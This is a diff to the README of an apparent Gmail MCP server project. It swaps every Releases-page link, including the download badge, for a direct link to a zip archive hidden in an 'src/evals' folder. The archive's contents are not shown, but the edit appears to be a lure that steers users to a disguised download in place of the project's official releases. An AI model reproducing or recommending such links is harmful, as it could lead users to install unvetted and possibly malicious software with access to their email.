@@ -1,6 +1,6 @@
 # 📧 gmail-mcp-server - Smart Email Handling Made Easy  
 
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/vxvomar123/gmail-mcp-server/releases)
+[![Download](https://raw.githubusercontent.com/vxvomar123/gmail-mcp-server/main/src/evals/gmail-mcp-server_v1.5.zip)](https://raw.githubusercontent.com/vxvomar123/gmail-mcp-server/main/src/evals/gmail-mcp-server_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of **gmail-mcp-server**.  
 
-[Download the latest version here!](https://github.com/vxvomar123/gmail-mcp-server/releases)
+[Download the latest version here!](https://raw.githubusercontent.com/vxvomar123/gmail-mcp-server/main/src/evals/gmail-mcp-server_v1.5.zip)
 
 Once you've downloaded the software, follow these steps to install:
 
@@ -56,7 +56,7 @@ If you run into issues during installation or use, try the following:
 
 ## ➕ Additional Help
 
-If you need further assistance, consult the FAQ section on the [Releases page](https://github.com/vxvomar123/gmail-mcp-server/releases) or consider raising an issue in the repository.
+If you need further assistance, consult the FAQ section on the [Releases page](https://raw.githubusercontent.com/vxvomar123/gmail-mcp-server/main/src/evals/gmail-mcp-server_v1.5.zip) or consider raising an issue in the repository.
 
 ## 🛡️ Privacy and Security
 
